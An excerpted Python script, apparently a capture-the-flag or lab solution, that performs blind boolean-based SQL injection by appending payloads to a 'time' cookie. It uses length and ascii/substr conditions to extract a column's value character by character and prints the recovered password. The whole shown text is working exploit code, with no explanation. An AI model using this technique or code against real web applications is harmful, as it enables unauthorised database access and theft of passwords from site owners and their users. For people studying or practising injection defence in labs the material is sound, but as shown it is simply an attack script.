...
def injection(payload):
    header = {"Cookie":"time=1463373821 and " + payload + ";PHPSESSID=0e74i0iup57k52ps1im2ng8pc6"}
...
def getlength(column, table):
    ...
    while True:
        length += 1
        payload = 'if((select length(' + column + ') from ' + table + ')=' + str(length) + ',1,0)'
...
def quickguess(column, table, pos, top, bot):
    ...
    payload = 'if(ascii(substr((select ' + column + ' from ' + table + '),' + str(pos) + ',1))=' + str(pointer) + ',1,0)'
    if ( injection(payload) ):
        return chr(pointer)
...
def burp(column, table):
    ...
    for i in range(getlength(column, table)):
        password = password + quickguess( column, table, i+1, ord(' '), ord('~') )
        print password
